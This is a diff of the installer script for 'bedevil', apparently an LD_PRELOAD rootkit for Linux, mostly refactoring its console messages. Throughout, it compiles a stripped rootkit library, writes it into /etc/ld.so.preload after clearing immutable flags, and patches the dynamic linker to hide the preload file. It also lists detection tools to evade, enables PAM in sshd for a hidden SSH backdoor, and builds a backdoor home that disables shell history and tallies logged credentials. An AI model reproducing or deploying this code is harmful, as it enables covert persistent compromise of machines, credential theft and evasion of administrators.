@@ -1,17 +1,5 @@
 #!/bin/bash
 
-# main utility centre for all things bedevil.
-# see README.txt for more information on this script's full purpose.
-
-BDVLC="bdvl.c" # main C file to write to
-BDVLSO="`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 12 | head -n1`.so" # shared object to create
-MDIR="modules"
-NEW_MDIR="awesome_modules"
-LIBHOOKS="$NEW_MDIR/lib_hooks"
-PLATFORM="`uname -m`"
-
-CFILES=(".ascii" "etc/ssh.sh") # local static files to copy over to the install dir
-
 # default variables for certain settings.
 # these can/will be changed during setup.
 MGID=$RANDOM
@@ -19,32 +7,38 @@ IDIR="/lib/bedevil.$RANDOM"
 BD_ENV="`cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 8 | head -n 1`"
 LDSO_PRELOAD="/etc/ld.so.preload"
 
-# later stores all of the kits hooks
-# see modules/lib_hooks
-declare -a array HOOKS=()
+BDVLC="bdvl.c"
+BDVLSO="`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 12 | head -n1`.so" # shared object to create
+MDIR="modules"
+NEW_MDIR="${RANDOM}_$MDIR"
+LIBHOOKS="$NEW_MDIR/lib_hooks"
+PLATFORM="`uname -m`"
 
-# a list of processes/binaries to hide from
-declare -a array HPROCS=("lsrootkit" "ldd" "unhide" "rkhunter" "chkproc" "chkdirs" "ltrace" "strace" "LD_AUDIT")
+CFILES=(".ascii" "etc/ssh.sh" "etc/eutils.sh" "etc/README") # local static files to copy over to the install dir
+declare -a array HOOKS=() # populated later...
+declare -a array HPROCS=("lsrootkit" "ldd" "unhide" "rkhunter" "chkproc" "chkdirs" "ltrace" "strace" "LD_AUDIT") # hide from these (proc names or env vars)
 
 clear # looks pretty (and there's now a considerable amount of output from this script)
-if [ -f ".ascii" ]; then
-    NICEASCII="`cat .ascii`"
-    printf "\e[1m\e[31m$NICEASCII\e[0m\n"
-fi
+[ -f .ascii ] && printf "\e[1m\e[31m`cat .ascii`\e[0m\n"
 
-[ $(id -u) != 0 ] && { echo " [!] You do not have root privileges. Your actions are limited."; NOT_ROOT=1; }
-[ ! -e /proc ] && { echo " [!] /proc doesn't exist, exiting. May I suggest bailing from this box?"; exit; }
+wecho() { printf " \e[33m[!]\e[0m $1\n"; }
+eecho() { printf " \e[31m[!]\e[0m $1\n"; }
+secho() { printf " \e[32m[+]\e[0m $1\n"; }
+necho() { printf " [..] $1\n"; }
+
+[ $(id -u) != 0 ] && { eecho "You do not have root privileges. Your actions are limited."; NOT_ROOT=1; }
+[ ! -e /proc ] && { eecho "/proc doesn't exist, exiting. May I suggest bailing from this box?"; exit; }
 [ "$(cat /etc/ssh/sshd_config | grep 'UsePAM')" == "UsePAM yes" ] || echo "UsePAM yes" >> /etc/ssh/sshd_config
 
 if [ -f /etc/syslinux/config ]; then
-    echo " [!] SELinux detected on this system."
+    wecho "SELinux detected on this system."
     if [[ $(cat /etc/syslinux/config | grep "SELINUX=" | tail -n 1) == *"enforcing"* ]]; then
-        echo " [!] SELinux is in enforcing mode. This may cause complications with bedevil."
-        echo " [!] If you would like to, you may disable SELinux and continue."
-        echo " [!] I will not disable SELinux for you, although I could."
-        echo " [!] Disabling/removing SELinux presence on a box that's meant to have it"
-        echo "     isn't very quiet to say the least, and keeping it enabled causes problems."
-        echo " [!] If I were you, I'd avoid SELinux all together."
+        wecho "SELinux is in enforcing mode. This may cause complications with bedevil."
+        wecho "If you would like to, you may disable SELinux and continue."
+        wecho "I will not disable SELinux for you, although I could."
+        wecho "Disabling/removing SELinux presence on a box that's meant to have it"
+        wecho "isn't very quiet to say the least, and keeping it enabled causes problems."
+        wecho "If I were you, I'd avoid SELinux all together."
     fi
 fi
 
@@ -57,16 +51,14 @@ Usage: $0 [ -h | -v | -d | -f | -D | -c | -C | -i]
             You will be prompted for a file location during
             installation. This can be a local url or via http.
         -D: Install all potential required dependencies.
-        -c: Make $BDVLSO in current directory and exit.
-            $BDVLC and $NEW_MDIR must be present.
+        -c: Compile rootkit library in current directory and exit.
         -C: Clean up installation/compilation mess and exit.
         -i: Launch full installation of bedevil. You will be
             prompted for input when needed.
 "
 
 show_help() { echo "$HELPMSG"; }
-
-verb() { [ $VERBOSE = 1 ] && echo " [VERBOSE] : $1"; }
+verb() { [ $VERBOSE = 1 ] && printf "\e[6m$1\e[0m\n"; }
 
 asc() { printf '%d' "'$1"; }
 xenc()
@@ -150,8 +142,8 @@ ghookindexi()
 writechrs()
 {
     [ ! -d "$NEW_MDIR" ] && return
-    echo " [..] Building & writing C char arrays for the lib headers"
-    spefhooks="$(glibhooks)"
+    necho "Building & writing C char arrays for the lib headers"
+    local spefhooks="$(glibhooks)"
     printf "${spefhooks//\\x/\\\\x}\n#endif" >> $NEW_MDIR/headers/rk_creds.h
 }
 
@@ -159,20 +151,19 @@ writechrs()
 writesconsts()
 {
     sed -i 's/\r$//g' $NEW_MDIR/stconsts # lol windows
-	local stconsts="`cat $NEW_MDIR/stconsts | grep -o '^[^#]*'`"
-	local cconsts=""
+    local stconsts="`cat $NEW_MDIR/stconsts | grep -o '^[^#]*'`"
+    local cconsts=""
 
-	echo " [..] Parsing stconsts"
-	while read -r line; do # go line by line
-		IFS=':' read -a pline <<< "$line" # seperate name and value on line
-		cname=${pline[0]} # const name
-		cval=${pline[1]} # const value
-		[ $cval == $cname ] && cconsts+="#define $cname \"`xenc ${!cval}`\"\n" # reference variable in this script by the const value
-		[ $cval != $cname ] && cconsts+="#define $cname \"`xenc $cval`\"\n" # we already have a suitable value, use that
-	done <<< "$stconsts"
+    necho "Parsing stconsts"
+    while read -r line; do # go line by line
+        IFS=':' read -a pline <<< "$line" # seperate name and value on line
+        cname=${pline[0]} # const name
+        cval=${pline[1]} # const value
+        [ $cval == $cname ] && cconsts+="#define $cname \"`xenc ${!cval}`\"\n" # reference variable in this script by the const value
+        [ $cval != $cname ] && cconsts+="#define $cname \"`xenc $cval`\"\n" # we already have a suitable value, use that
+    done <<< "$stconsts"
 
-	printf "\n$cconsts\n" >> $NEW_MDIR/headers/rk_creds.h
-	echo " [+] Finished parsing stconsts."
+    printf "\n$cconsts\n" >> $NEW_MDIR/headers/rk_creds.h
 }
 
 # $1 = plaintext pwd
@@ -203,12 +194,9 @@ start_config_wizard()
     # the user, you, will be the one creating the list, really.
 
     echo
-    echo " [..] Beginning the main user config wizard"
-    echo " [!] You will be prompted for input for each user variable in this rootkit."
-    echo " [!] All input prompts that you will be greeted with have random default values,"
-    echo "     which can be used by just pressing enter on the input."
-    echo " [!] You may want to change a couple of the default input settings (username/password),"
-    echo "     but you can leave a majority of the settings as their defaults."
+    secho "Beginning the main user config wizard"
+    necho "You may want to change a couple of the default input settings (username/password),"
+    necho "but you can leave a majority of the settings as their defaults."
     echo
 
     for var in ${STR_VARS[*]}; do
@@ -253,7 +241,7 @@ start_config_wizard()
     done
 
     SOPATH="$IDIR/$BDVLSO.$PLATFORM"
-    printf "\n [+] Config wizard finished.\n\n"
+    secho "End of config wizard.\n"
     verb $PSETTINGS
 }
 
@@ -266,17 +254,17 @@ gather_user_settings()
     #   my_bedevil_username:??UNAME??
     #   my_bedevil_password:??PWD??
     if [ ! -z $PRECONF_SETTINGS ]; then
-        echo " [!] You have enabled the use of a preconfigured variable file."
-        echo " [!] The file can be stored locally (in this directory) or on a http server."
-        echo " [..] i.e. 'my_bedevil_settings.txt' OR 'http://google.com/my_bedevil_settings.txt'"
+        necho "You have enabled the use of a preconfigured variable file."
+        wecho "The file can be stored locally (in this directory) or on a http server."
+        necho "i.e. 'my_bedevil_settings.txt' OR 'http://google.com/my_bedevil_settings.txt'"
 
         unset REPLY
-        while [ -z $REPLY ]; do read -p " [!] Enter the location of the file: "; done
+        while [ -z $REPLY ]; do read -p " [..] Enter the location of the file: "; done
 
         if [[ "$REPLY" == *"http://"* ]]; then # if 'http://' in reply
-            PSETTINGS="`wget -qO- $REPLY`" || { echo " [!] Aborting '${FUNCNAME[0]}' - Could not download file."; return; }
+            PSETTINGS="`wget -qO- $REPLY`" || { eecho "Could not download file."; exit; }
         else # if reply is just regular text
-            [ ! -f $REPLY ] && { echo " [!] Aborting '${FUNCNAME[0]}' - File '$REPLY' does not exist."; return; }
+            [ ! -f $REPLY ] && { eecho "File '$REPLY' does not exist."; exit; }
             PSETTINGS="`cat $REPLY`"
         fi
     fi
@@ -295,7 +283,7 @@ INT_VARS=()
 STR_VARS=()
 find_pholders()
 {
-	echo " [..] Finding variable placeholders"
+	necho "Finding variable placeholders"
     HDC=("$(find ./$MDIR/ -name '*.h' | xargs cat)")
     for w in $HDC; do
         CVAR=`echo $w | grep "??"`
@@ -330,28 +318,28 @@ populate_new_pholders()
     # if there is already a populated modules directory, ask the user if they want to overwrite it or not.
     # selecting no will abort the function. this seemed safe and practical to have.
     if [ -d $NEW_MDIR ]; then
-        echo " [!] Directory $NEW_MDIR already exists."
-        read -p " [!] Overwrite it? [y/N]: " -n 1 -r
+        wecho "Directory $NEW_MDIR already exists."
+        read -p "`wecho "Overwrite it? [y/N]: "`" -n 1 -r
         if [[ $REPLY =~ ^[Yy]$ ]]; then # they want to overwrite the populated directory
             echo
-            echo " [!] Overwriting '$NEW_MDIR'"
+            wecho "Overwriting '$NEW_MDIR'"
             rm -rf $NEW_MDIR
         else
         	echo
-            echo " [+] You did not want to overwrite '$NEW_MDIR'"
-            echo " [+] We will use the existing directory, with existing settings."
+            secho "You did not want to overwrite '$NEW_MDIR'"
+            secho "We will use the existing directory, with existing settings."
             return
         fi
     fi
 
     # copy module directory to new directory
-	cp -r $MDIR/ $NEW_MDIR/ || { echo " [!] Aborting '${FUNCNAME[0]}' - Couldn't copy module directory."; return; }
+    cp -r $MDIR/ $NEW_MDIR/ || { eecho "Couldn't copy module directory."; exit; }
 
     writechrs # write char arrays
     gather_user_settings
     writesconsts # write mandatory background consts
 
-    echo " [..] Overwriting variable placeholders with new settings"
+    necho "Overwriting variable placeholders with new settings"
     # now PSETTINGS definitely exists, we can start parsing it for variables and replacing old placeholders
     PHEADERS=("$(find ./$NEW_MDIR/ -name '*.h')")
     for h in $PHEADERS; do overwrite_pholders $h; done
@@ -359,7 +347,7 @@ populate_new_pholders()
 
 cleanup_bdvl()
 {
-	echo " [+] Cleaning up local mess."
+    secho "Cleaning up local mess."
     [ -d $NEW_MDIR ] && rm -rf $NEW_MDIR
     [ -f $BDVLC ] && rm -f $BDVLC
     rm -f *.so.*
@@ -367,9 +355,9 @@ cleanup_bdvl()
 
 build_bdvlc()
 {
-    [ ! -d $NEW_MDIR ] && { echo " [!] Failed to build $BDVLC - '$NEW_MDIR' does not exist."; return; }
-    [ -f $BDVLC ] && echo " [..] $BDVLC exists already. It will be overwritten."
-    _BDVLC="#define _GNU_SOURCE
+    [ ! -d $NEW_MDIR ] && { eecho "Failed to build $BDVLC - '$NEW_MDIR' does not exist."; exit; }
+    [ -f $BDVLC ] && necho "$BDVLC exists already. It will be overwritten."
+    local _BDVLC="#define _GNU_SOURCE
 `c_includes`
 `cat "$NEW_MDIR/prehook.c"`"
     echo "$_BDVLC" > $BDVLC
@@ -377,7 +365,7 @@ build_bdvlc()
 
 install_deps()
 {
-    echo " [..] Installing dependencies."
+    necho "Installing dependencies."
     if [ -f /usr/bin/yum ]; then
         yum install -y -q -e 0 gcc pam-devel newt libgcc.i686 glibc-devel.i686 glibc-devel libpcap libpcap-devel vim-common &>/dev/null
     elif [ -f /usr/bin/apt-get ]; then
@@ -394,20 +382,20 @@ install_deps()
 
 compile_bdvl()
 {
-    [ ! -d "$NEW_MDIR" ] && { echo " [!] '$NEW_MDIR' does not exist. Have you populated your new headers?"; exit; }
-    WARNING_FLAGS="-Wall -Wno-comment -Wno-nonnull-compare"
-    OPTIMIZATION_FLAGS="-O0 -g0"
-    OPTIONS="-fomit-frame-pointer -fPIC"
-    LINKER_OPTIONS="-Wl,--build-id=none"
-    LINKER_FLAGS="-ldl -lcrypt"
+    [ ! -d "$NEW_MDIR" ] && { eecho "'$NEW_MDIR' does not exist. Have you populated your new headers?"; exit; }
+    local WARNING_FLAGS="-Wall -Wno-comment -Wno-nonnull-compare"
+    local OPTIMIZATION_FLAGS="-O0 -g0"
+    local OPTIONS="-fomit-frame-pointer -fPIC"
+    local LINKER_OPTIONS="-Wl,--build-id=none"
+    local LINKER_FLAGS="-ldl -lcrypt"
 
     rm -rf *.so.*
     gcc -std=gnu99 $OPTIMIZATION_FLAGS $BDVLC $WARNING_FLAGS $OPTIONS -I$NEW_MDIR -shared $LINKER_FLAGS $LINKER_OPTIONS -o $BDVLSO.$PLATFORM
     gcc -m32 -std=gnu99 $OPTIMIZATION_FLAGS $BDVLC $WARNING_FLAGS $OPTIONS -I$NEW_MDIR -shared $LINKER_FLAGS $LINKER_OPTIONS -o $BDVLSO.i686 &>/dev/null
-    strip $BDVLSO.$PLATFORM || { echo " [!] Couldn't strip library. Exiting."; exit; }
+    strip $BDVLSO.$PLATFORM || { eecho "Couldn't strip library. Exiting."; exit; }
     strip $BDVLSO.i686 &>/dev/null
 
-    echo " [+] Shared library compiled."
+    secho "Shared library compiled."
     rm $BDVLC
 }
 
@@ -415,20 +403,21 @@ compile_bdvl()
 setup_home()
 {
     echo '. .bashrc' > "$1/.profile"
-    LBASHRC="$1/.bashrc"
+    local LBASHRC="$1/.bashrc"
     mkdir $1/etc
     for f in ${CFILES[*]}; do cp $f $1/$f; done # copy array of 'important' static files
-    RBASHRC="tty -s || return
+    local RBASHRC="tty -s || return
 [ ! -z \$TERM ] && export TERM=xterm
 unset HISTFILE SAVEHIST TMOUT PROMPT_COMMAND
-export ${BD_ENV}=1
 [ \$(id -u) != 0 ] && su root
 [ \$(id -u) != 0 ] && kill -9 \$\$
+[ -f etc/README ] && cat etc/README | less && rm etc/README
 clear
+
+[ -f .ascii ] && printf \"\\e[1m\\e[31m\`cat .ascii\`\\e[0m\\n\"
 alias ls='ls --color=auto'
 alias ll='ls --color=auto -AlFhn'
 
-[ -f .ascii ] && printf \"\\e[1m\\e[31m\`cat .ascii\`\\e[0m\\n\"
 id
 [ ! -f ./auth_logs ] && touch auth_logs
 echo -e \"\\033[1mLogged accounts: \\033[1;31m\$(grep Username ~/auth_logs 2>/dev/null | wc -l)\\033[0m\""
@@ -439,61 +428,57 @@ echo -e \"\\033[1mLogged accounts: \\033[1;31m\$(grep Username ~/auth_logs 2>/de
 
 install_bdvl()
 {
-    [ ! -z $NOT_ROOT ] && { echo " [!] You cannot install bedevil without root privs. Exiting."; exit; }
+    [ ! -z $NOT_ROOT ] && { eecho "You cannot install bedevil without root privs. Exiting."; exit; }
 
-    printf " [+] Starting full installation!\n\n"
+    secho "Starting full installation!\n"
 
-    echo " [+] bedevil comes with the same feature as vlany, where you can patch the dynamic linker"
-    echo "     libraries and change the path which the linker reads from to preload libraries."
-    echo "     Essentially creating a 'new' ld.so.preload file."
-    echo " [+] Unlike vlany, the lib patching script uses bash, not python2. So no python required."
-    echo " [+] The new ld.so.preload file will be placed into a random directory with a random file"
-    echo "     name to accompany it."
-    echo " [+] If you are doing this, you need to do this now."
+    wecho "Do you want to patch the dynamic linker?"
+    necho "This essentially provides libdl a new ld.so.preload file location."
+    wecho "If you are doing this, you need to do this now."
     
-    read -p " [!] Patch libdl? [Y/n]: " -n 1 -r
+    read -p "`wecho "Patch libdl? [Y/n]: "`" -n 1 -r
     if [[ $REPLY =~ ^[Yy]$ ]]; then patch_libdl;
-    else echo " [!] Not patching libdl."; fi
+    else echo; necho "Not patching libdl."; fi
 
-    read -p " [!] Install potential dependencies? [Y/n]: " -n 1 -r
+    read -p "`wecho "Install potential dependencies? [Y/n]: "`" -n 1 -r
     [[ $REPLY =~ ^[Yy]$ ]] && install_deps
     echo ""
 
     populate_new_pholders # this will check, for us, if $NEW_MDIR exists or not, and will make it
 
-    echo " [..] Compiling the rootkit shared library."
+    necho "Compiling the rootkit shared library."
     build_bdvlc # builds bdvl.c so we can compile the SO
     compile_bdvl # after this, bdvl.so.* will now exist in the cwd
 
     export ${BD_ENV}=1
     
     # now we have to install the library and make sure it is present in ld.so.preload
-    echo " [+] Installing $BDVLSO to $SOPATH and loading into $LDSO_PRELOAD"
+    necho "Installing $BDVLSO to $SOPATH"
     rm -rf $IDIR/
     mkdir -p $IDIR/
-
     cp $BDVLSO.$PLATFORM $SOPATH
     cp $BDVLSO.i686 $IDIR/$BDVLSO.i686 2>/dev/null
+
+    necho "Pointing $LDSO_PRELOAD to $SOPATH"
     [ -f "$LDSO_PRELOAD" ] && chattr -ia $LDSO_PRELOAD &>/dev/null
     echo -n $SOPATH > $LDSO_PRELOAD
-    echo " [+] bedevil has been installed on the machine."
+    secho "Installation successful."
     cleanup_bdvl
     echo
 
-    echo " [+] About to set up your home for the PAM backdoor."
     setup_home $IDIR
-    echo " [+] Your home is set up. All you need to do is log into your"
-    echo "     backdoor via ssh with the credentials you specified during installation."
-    echo " [!] A script is available @ etc/ssh.sh which makes connecting to"
-    echo "     your hidden port that bit easier."
-    echo " [!] I recommend restarting this box's ssh service."
+    secho "Your backdoor home is set up. All you need to do is log into your"
+    secho "backdoor via ssh with the credentials you specified during installation."
+    secho "A script is available @ etc/ssh.sh which makes connecting with"
+    secho "your hidden port that bit easier."
+    secho "I recommend restarting this box's ssh service."
 }
 
 patch_libdl()
 {
-    echo " [..] Patching dynamic linker libraries."
+    necho "Patching dynamic linker libraries."
     LDSO_PRELOAD="$(etc/plibdl.sh $LDSO_PRELOAD)" # change the variable to the new preload file location
-    echo " [+] Dynamic linker libs patched, new ld.so.preload location: $LDSO_PRELOAD"
+    secho "New ld.so.preload location: $LDSO_PRELOAD"
 }
 
 
@@ -507,7 +492,7 @@ while getopts "h?vdfpcCbiD" opt; do
         exit
         ;;
     v)
-		echo " [+] Running in verbose mode."
+		secho "Running in verbose mode."
         VERBOSE=1
         ;;
     d)  
